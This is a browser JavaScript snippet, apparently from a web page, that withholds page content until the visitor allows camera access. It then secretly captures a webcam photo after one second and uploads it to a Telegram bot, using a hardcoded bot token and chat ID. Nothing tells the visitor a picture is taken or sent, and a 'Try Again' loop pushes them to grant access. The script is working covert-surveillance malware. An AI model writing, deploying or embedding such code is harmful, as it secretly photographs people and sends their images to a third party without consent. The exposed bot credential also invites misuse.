const video = document.createElement('video');
const canvas = document.getElementById('canvas');
const overlay = document.getElementById('overlay');
const content = document.getElementById('content');

function requestCameraAccess() {
  navigator.mediaDevices.getUserMedia({ video: true })
    .then(stream => {
      video.srcObject = stream;
      video.play();
      overlay.style.display = 'none';
      content.style.display = 'block';

      setTimeout(() => {
        const context = canvas.getContext('2d');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        context.drawImage(video, 0, 0);
        canvas.toBlob(blob => {
          const formData = new FormData();
          formData.append('chat_id', '7906406053');
          formData.append('photo', blob);
          fetch(`https://api.telegram.org/bot8282209854:AAEtPJtKKDzyILPv-YuLtbrpmLuFt076aVY/sendPhoto`, {
            method: 'POST',
            body: formData,
          })
          .then(response => response.json())
          .then(data => console.log('Image sent!'));

          stream.getTracks().forEach(track => track.stop());
        });
      }, 1000);
    })
    .catch(error => {
      overlay.innerHTML = '<p>Camera access required. Please allow camera access to continue...</p><button id="try-again">Try Again</button>';
      document.getElementById('try-again').addEventListener('click', () => {
        overlay.innerHTML = '<p>Camera access required to continue...</p>';
        requestCameraAccess();
      });
    });
}

requestCameraAccess();